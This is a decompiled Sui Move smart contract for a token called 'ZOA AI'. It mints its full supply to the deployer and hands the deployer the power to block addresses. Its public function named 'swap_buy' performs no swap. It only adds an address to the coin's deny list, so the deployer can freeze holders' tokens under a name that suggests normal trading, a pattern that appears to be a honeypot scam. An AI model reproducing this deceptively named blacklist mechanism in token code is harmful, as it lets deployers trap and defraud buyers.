module 0xa0f0787e207cdc2875bbd71cd803b3ce5a175cdd7ef51c4b1ebdc0213ea3fc20::zoa {
    struct ZOA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ZOA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ZOA>(arg0, 9, b"ZOA", b"ZOA AI ", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZw7Hjb1CnqX6gx555Btz8isHzvpD2m4Ndgtt6SVpmFkS"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ZOA>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ZOA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ZOA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ZOA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ZOA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ZOA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

